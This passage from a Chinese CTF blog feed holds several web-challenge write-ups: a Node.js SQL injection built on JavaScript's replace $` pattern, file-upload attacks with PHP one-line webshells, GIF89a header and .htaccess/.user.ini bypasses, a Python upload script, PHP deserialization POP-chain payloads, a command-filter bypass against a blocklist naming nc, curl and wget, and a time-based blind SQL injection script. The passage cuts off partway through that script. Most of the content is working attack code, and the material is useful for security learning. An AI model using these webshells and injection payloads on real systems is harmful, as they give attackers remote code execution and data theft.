class="line">module.exports = router;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;,(req,res,next)=&gt;&#123;</span><br><span class="line">    if(req.query.info)&#123;</span><br><span class="line">        if(req.url.match(/\,/ig))&#123;</span><br><span class="line">            res.end(&#x27;hacker1!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        var info = JSON.parse(req.query.info);</span><br><span class="line">        if(info.username&amp;&amp;info.password)&#123;</span><br><span class="line">            var username = info.username;</span><br><span class="line">            var password = info.password;</span><br><span class="line">            if(info.username.match(/\&#x27;|\&quot;|\\/) || info.password.match(/\&#x27;|\&quot;|\\/))&#123;</span><br><span class="line">                res.end(&#x27;hacker2!&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            var sql = &quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;;</span><br><span class="line">            sql = sql.replace(&quot;&#123;username&#125;&quot;,username);</span><br><span class="line">            sql = sql.replace(&quot;&#123;password&#125;&quot;,password);</span><br><span class="line">            connection.query(sql,function (err,rs) &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                res.end(&#x27;error1&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                if(rs.length&gt;0)&#123;</span><br><span class="line">                res.sendFile(&#x27;/flag&#x27;);</span><br><span class="line">                &#125;else &#123;</span><br><span class="line">                res.end(&#x27;username or password error&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            res.end(&quot;please input the data&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.end(&quot;please input the data&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>题目需要传入一个info值，格式是json，但是$req.url$后面过滤了逗号，这里用URL编码绕过，<br>继续审计后面，一个SQL语句，把我们传入的username还有password过滤后拼接到语句当中，但是把闭合符都给过滤了，这里引入JavaScript中replace的一个知识点</p><p><img src="/./../img/XHLJ/web2-1.png" alt="web2" title="知识点"></p><p>我们这里就是用$&#96;来过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$` 例子:</span><br><span class="line">var a=&quot;i am not a dog dog&quot;</span><br><span class="line">a=a.replace(&quot;dog&quot;,&quot;$`cat&quot;)</span><br><span class="line">他后面的pattern值应该是找到第一个和dog匹配的位置，然后把$`替换成这个位置之前的字符串</span><br><span class="line">所以pattern=i am not a cat</span><br><span class="line">然后把a当中的dog替换成pattern</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以我们这里的$`可以识别成select * from userinfo where username = &#x27;,这里有一个单引号可以用来闭合</span><br><span class="line">构造payload</span><br><span class="line">&#123;&quot;username&quot;:&quot;$` or 1=1 --+&quot;%2c&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><p>参考WP：<a href="https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw">https://mp.weixin.qq.com/s/jV-mrqFJOqSBlBDXRaEjqw</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛事回顾 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2024/08/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/08/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="正常的一句话木马"><a href="#正常的一句话木马" class="headerlink" title="正常的一句话木马"></a>正常的一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;   //开始上传图片中写入的一句话木马</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[&#x27;cmd&#x27;]);&lt;/script&gt;     //    用于绕过 &lt;?</span><br><span class="line"></span><br><span class="line">还可以在前面加 幻术头绕过   GIF89a（GIF图片的ascii 值）</span><br></pre></td></tr></table></figure><hr><h3 id="若使用exif-imagetype-函数-对上传文件后缀进行了限制。"><a href="#若使用exif-imagetype-函数-对上传文件后缀进行了限制。" class="headerlink" title="若使用exif_imagetype() 函数 对上传文件后缀进行了限制。"></a>若使用exif_imagetype() 函数 对上传文件后缀进行了限制。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;eval($_REQUEST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//三种图片的前缀</span><br><span class="line">JPG ：FF D8 FF E0 00 10 4A 46 49 46（16进制编码）</span><br><span class="line">GIF：47 49 46 38 39 61（ascll值是GIF89a）</span><br><span class="line">PNG： 89 50 4E 47</span><br></pre></td></tr></table></figure><hr><h3 id="user-ini-文件"><a href="#user-ini-文件" class="headerlink" title=".user.ini 文件"></a>.user.ini 文件</h3><p style='font-size:12x;text-indent:2em'>到现在我们就可以上传成功一个图片了，但它一句话木马并不能被作为PHP文件解析，那么怎么样去绕过？？？在学习文件上传时应该都学过， .htaccess 文件，可以把后缀为其他类型的图片解析成php文件对，使我们上传的图片内容可以被解析，但是这里对 .htaccess文件也做了限制，所以我们就需要想其他的办法。</p><h4 id="一般的-htaccess文件"><a href="#一般的-htaccess文件" class="headerlink" title="一般的.htaccess文件"></a>一般的.htaccess文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .zm</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">htaccess=&quot;&quot;&quot;</span><br><span class="line">#define width 666</span><br><span class="line">#define height 666</span><br><span class="line">AddType application/x-httpd-php .ahhh</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shell=b&quot;GIF89a12&quot;+base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&quot;)</span><br><span class="line">url=&quot;http://c7352155-c63d-4323-9d91-b38477e4f41f.node5.buuoj.cn:81/?_=$&#123;%f8%f8%f8%f8^%a7%bf%bd%ac&#125;&#123;%f8&#125;();&amp;%f8=get_the_flag&quot;</span><br><span class="line">files=&#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line">data=&#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">response=requests.post(url=url,data=data,files=files)</span><br><span class="line">print(response.text)</span><br><span class="line">files=&#123;&#x27;file&#x27;:(&#x27;shell.ahhh&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line">response=requests.post(url=url,data=data,files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h5 id="这里我们引入一个php目录配置文件-user-ini"><a href="#这里我们引入一个php目录配置文件-user-ini" class="headerlink" title="这里我们引入一个php目录配置文件 .user.ini"></a>这里我们引入一个php目录配置文件 .user.ini</h5><p>作用：这里如果我们上传一个.user.ini 文件，那么当我们访问目录中的任何php文件时，都会调用.user.ini中指定的文件以php的形式进行读取我<br>们在user.ini设置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//上传.user.ini文件，条件如下：</span><br><span class="line"></span><br><span class="line">(1)服务器脚本语言为PHP                     </span><br><span class="line">(2)对应目录下面有可执行的php文件              //index.php</span><br><span class="line">(3)服务器使用CGI／FastCGI模式   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上传的文件内容</span><br><span class="line">GIF89a                         //auto_prepend_file是在文件前插入，而auto_append_file是在文件最后才插入。                  </span><br><span class="line">auto_prepend_file=b.gif       //需要注意上穿的文件名字要和设定的名字一样，这里可以设定多个</span><br></pre></td></tr></table></figure><p>上传了 $.user.ini$ 文件之后，执行 $.user.ini$ 文件目录下的任意PHP文件，那么他就会执行我们在 $.user.ini$ 文件中制定的那个任意文件，且作为PHP文件执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举个例子理解user.ini作用：</span><br><span class="line">/*这是.user.ini的两个配置  </span><br><span class="line">auto_prepend_file是在文件前插入</span><br><span class="line">auto_append_file是在文件最后才插入*/</span><br><span class="line"></span><br><span class="line">1.在user.ini 中设置</span><br><span class="line">auto_prepend_file=b.gif</span><br><span class="line"></span><br><span class="line">2.在b.gif中设置 一句话木马</span><br><span class="line"></span><br><span class="line">3.还有个php文件 如：前面做题中的index.php    </span><br><span class="line"></span><br><span class="line">如果这三个条件在同一个目录下面，就会出先问题，这里就相当于 在index.php中写</span><br><span class="line">了include &quot;b.gif&quot; , 可以进行文件包含，导致的后果是：当我们对目录中的index.</span><br><span class="line">php进行访问的时候，会调用.usre.ini 中的文件把b.gif文件以php的形式进行取造</span><br><span class="line">成.user.ini的漏洞</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line"># &lt;?php eval($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022:popchains</title>
      <link href="/2024/08/04/2022-popchains/"/>
      <url>/2024/08/04/2022-popchains/</url>
      
        <content type="html"><![CDATA[<h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><p style="font-size:10px;color:#7f8c93">题目来源：NSSCTF<br>题目类型：WEB<br>设计考点：POP链，PHP反序列化</p><h3 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p style="font-size:16px">看到第一段判断出需要用GET传入一个<strong>wish</strong>的值，然后对其反序列化，接下来需要分析下面一串POP链</p><hr><ol><li><p>首先寻找终点</p><p>我们在<strong>Try_Work_Hard</strong>类终发现了<strong>include</strong>函数判断出这里可以使用php伪协议来读取最后的$flag$文件,接下来判断如触发这个<strong>append</strong>函数，我们发现  <strong>__invoke</strong> 魔术方法中存在append函数得知需要发动 <strong>__invoke</strong> 魔术方法来达到终点， <strong>__invoke</strong> 魔术方法是当一个类被当做函数运行的时候发动</p><p style="font-size:12px">这里我们可以先对var这个append执行的值进行payload构建,<strong>$var=php://filter/convert.base64-encode/resource=/flag</strong></p></li><li><p>接下来找到如何让__invoke魔术方法发挥作用的地方</p><p>我们发现在<strong>Make_a_Change</strong>类中 <strong>__get</strong>魔术方法中有<code>return $function();</code><br>$function$的值可控，我们可以让$function$的值等于一个<strong>Try_Work_Hard</strong>类</p></li><li><p>接着寻找让__get魔术方法启动的地方，我们知道__get魔术方式是当我们访问一个类中私有或不存在的成员属性的时候自动触发，因此我们来到<strong>Road_is_Long</strong>，发现当中的__toString魔术方法访问了一个page变量，那我们可以让$this-&gt;string$等于<strong>Make_a_Change</strong>类，这样就能出发 <strong>__get</strong> 魔术方法，**__toSting<strong>魔术方法是当一个类被当做字符串使用时自动触发，我们就发现 <strong>__wakeup</strong>魔术方法中就有将字符串赋值给一个变量$page$而且$page$的值可控，那我们就让$page$等于一个</strong>Road_is_Long**类，我们暂且称第一个 <strong>Road_is_Long</strong> 类为$a$，第二个为$b$</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = new Make_a_Change();</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line">   </span><br></pre></td></tr></table></figure><p>a也就是我们要传入的wish，当a反序列化前会执行__wakeup魔术方法，这是会触发b的__toString在这时触发*<strong>Make_a_Change</strong>的__get魔术方法再到 <strong>Try_Work_Hard</strong>的__invoke魔术方法最后执行append提取到flag</p></li></ol><h2 id="我们最终获得的POP链如下"><a href="#我们最终获得的POP链如下" class="headerlink" title="我们最终获得的POP链如下"></a>我们最终获得的POP链如下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Road_is_Long::__wakeup() -&gt; Road_is_Long::__toString() -&gt; Make_a_Change::__get() -&gt; Try_Work_Hard::__invoke() -&gt; Try_Work_Hard::append()</span><br></pre></td></tr></table></figure><h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$f = new Try_Work_Hard();</span><br><span class="line">$m = new Make_a_Change();</span><br><span class="line">$m-&gt;effort = $f;</span><br><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = $m;</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>GET</strong>传入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HECTF2024</title>
      <link href="/2024/08/04/Hectf2024/"/>
      <url>/2024/08/04/Hectf2024/</url>
      
        <content type="html"><![CDATA[<h2 id="HECTF2024-Are-you-happy"><a href="#HECTF2024-Are-you-happy" class="headerlink" title="[HECTF2024]Are you happy?"></a>[HECTF2024]Are you happy?</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：WEB<br>设计考点：JS代码分析</p><p>题目环境打开发现是一款游戏，那么根据经验就是在游戏的JS代码里找FLAG,F12发现提示是base64，<br>那么就在JS文件里找到base64字符串<br>​ game.js里找，flag在里面，根据flag的格式，flag开头是HECTF得到flag</p><h2 id="HECTF2024-baby-unserialize"><a href="#HECTF2024-baby-unserialize" class="headerlink" title="[HECTF2024]baby_unserialize"></a>[HECTF2024]baby_unserialize</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：WEB<br>设计考点：POP链，PHP反序列化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo &quot;flag in /flag&lt;/br&gt;&quot;;</span><br><span class="line">class User&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $passwd;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $token = &quot;guest&quot;;</span><br><span class="line">    public function __construct($name,$passwd)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;passwd = $passwd;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;token = &quot;guest&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(!$this-&gt;check())&#123;</span><br><span class="line">            exit(0);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function check()&#123;</span><br><span class="line">        if ($this-&gt;token === &quot;admin&quot;)&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class class00&#123;</span><br><span class="line">    public function __call($a,$b)&#123;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($a, $b)&#123;</span><br><span class="line">        $b();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class class01&#123;</span><br><span class="line">    public $temp = 0;</span><br><span class="line">    public $str3;</span><br><span class="line">    public $cls;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        $this-&gt;temp = $this-&gt;cls-&gt;func1();</span><br><span class="line">        if ($this-&gt;temp === 1)&#123;</span><br><span class="line">            $this-&gt;cls-&gt;str1 = $this-&gt;str3;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;0&quot;;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;have fun&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class class02&#123;</span><br><span class="line">    public $payload;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;, $this-&gt;payload)) &#123; </span><br><span class="line">        system($this-&gt;payload.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;fuck you Hacker&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&quot;user&quot;]))&#123;</span><br><span class="line">    $user = unserialize(base64_decode($_POST[&quot;user&quot;]));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><ol><li><p>典型的php反序列化题 </p><p>首先寻找我们可以利用的点，发现$class02$当中有system语句且payload可控那么这里就是pop链的终点，他的触发魔术方式是__invoke那就要寻找哪里可以触发这个方法，注意到$class00$当中存在$b()当$b为class02类时就会触发invoke，那么又要寻找如何触发__set方法class01当中有一行代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;cls-&gt;str1 = $this-&gt;str3;</span><br></pre></td></tr></table></figure><p>当str3为class02那么就相当于$b&#x3D;new class02那么cls肯定为class00<br>继续寻找如何触发__tostring，找到User类当中的destruct方法有echo，那么赋值msg&#x3D;new class01(),但是他还要进过check()函数，就要让token的值为admin，但是反序列化会触发wakeup修改token那么payload就要绕过wakeup<br>分析完毕</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User:__destruct-&gt;class01:__toString-&gt;class00:__call-&gt;class00:__set-&gt;class02:__invoke</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"> class User&#123;</span><br><span class="line"> public $name;</span><br><span class="line"> public $passwd;</span><br><span class="line"> public $token;</span><br><span class="line"> public $msg;</span><br><span class="line"></span><br><span class="line"> public function __construct($name,$passwd)&#123;</span><br><span class="line">     $this-&gt;name = $name;</span><br><span class="line">     $this-&gt;passwd = $passwd;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;   </span><br><span class="line"></span><br><span class="line"> class class00&#123;</span><br><span class="line">     public function __call($a,$b)&#123;</span><br><span class="line">         return 1;</span><br><span class="line">     &#125;</span><br><span class="line">     public function __set($a, $b)&#123;</span><br><span class="line">         $this-&gt;$b();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> class class01&#123;</span><br><span class="line">     public $temp = 0;</span><br><span class="line">     public $str3;</span><br><span class="line">     public $cls;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> class class02&#123;</span><br><span class="line">     public $payload;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $a = new User(&quot;admin&quot;,&quot;123456&quot;);</span><br><span class="line"> $a-&gt;token = &quot;admin&quot;;</span><br><span class="line"> $a-&gt;msg = new class01();</span><br><span class="line"> $a-&gt;msg-&gt;cls = new class00();</span><br><span class="line"> $a-&gt;msg-&gt;str3 = new class02();</span><br><span class="line"> $a-&gt;msg-&gt;str3-&gt;payload = &quot;payload&quot;;</span><br><span class="line"> </span><br><span class="line"> echo serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> //O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在观察页面php版本为5.4存在成员个数不同绕过__wakeup的方法<br>直接修改payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    //O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span><br><span class="line">    </span><br><span class="line">    //Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    </span><br></pre></td></tr></table></figure><p>接下来就是分析WAF发现他过滤了绝大部分函数并且将输出和错误重定向到了“黑洞”,这里我们发现他没有过滤[]那么就可以用正则匹配绕过过滤&#x2F;bin&#x2F;ca[t]匹配cat命令，然后用||来绕过“黑洞”就可以回显flag了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///bin/ca[t] /fla[g] ||</span><br><span class="line"></span><br><span class="line"> //O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:21:&quot;/bin/ca[t] /fla[g] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span><br><span class="line"> </span><br><span class="line"> //Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="HECTF2024-baby-sql"><a href="#HECTF2024-baby-sql" class="headerlink" title="[HECTF2024]baby_sql"></a>[HECTF2024]baby_sql</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：WEB<br>设计考点：SQL布尔盲注</p>    首先万能密码进入后台    1' or 1=1#    然后发现题目不会回显报错，并且只会回显某人今天打卡了和找不到此人，那么就采用布尔盲注的方法爆破，构造payload时发现information.schema被过滤了那么就用mysql.innodb_table_stats绕过但是这张表里没有列名就暗示后面需要用无列名注入，我们构造脚本爆破数据库   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    #测试的时候服务器有点问题，爆破的时候总是要出问题，建议每一个函数多跑几次保证成功率，或者每次多修改一些time和sleep的时长保证正确率</span><br><span class="line">    from requests import post</span><br><span class="line">    import string</span><br><span class="line">    import time</span><br><span class="line">    </span><br><span class="line">    alpha = &quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot; + string.ascii_letters + string.digits</span><br><span class="line">    url = &quot;http://154.64.254.169:33113/worker.php&quot;</span><br><span class="line">    </span><br><span class="line">    def istime(data):</span><br><span class="line">        try:</span><br><span class="line">            resp = post(url,data=data,timeout=20)</span><br><span class="line">            return &quot;not&quot;</span><br><span class="line">        except:</span><br><span class="line">            return &quot;timeout&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 数据库长度为：7</span><br><span class="line">    def db_name_len():</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;.format(i)</span><br><span class="line">        data = &#123;&quot;name&quot;:payload&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if istime(data) == &quot;timeout&quot;:</span><br><span class="line">            print(&quot;数据库长度为：%d&quot;%i)</span><br><span class="line">            return i</span><br><span class="line">        